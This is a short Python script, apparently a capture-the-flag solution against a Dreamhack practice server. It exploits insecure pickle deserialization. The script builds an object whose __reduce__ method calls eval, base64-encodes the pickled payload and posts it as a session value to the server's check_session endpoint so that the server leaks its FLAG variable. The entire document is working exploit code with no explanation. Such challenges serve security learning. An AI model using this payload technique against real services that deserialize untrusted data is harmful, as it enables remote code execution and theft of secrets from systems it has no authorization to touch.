import requests, os, base64, pickle

port = 12561
url_index = f"http://host3.dreamhack.games:{port}/"
url_check = url_index + "check_session"


class Exploit:
    def __reduce__(self):
        return (__builtins__.eval, ('{"name":FLAG}',))


exploit_msg = base64.b64encode(pickle.dumps(Exploit())).decode("utf8")

param = {"session": exploit_msg}

r = requests.post(url_check, data=param)

print(r.text)
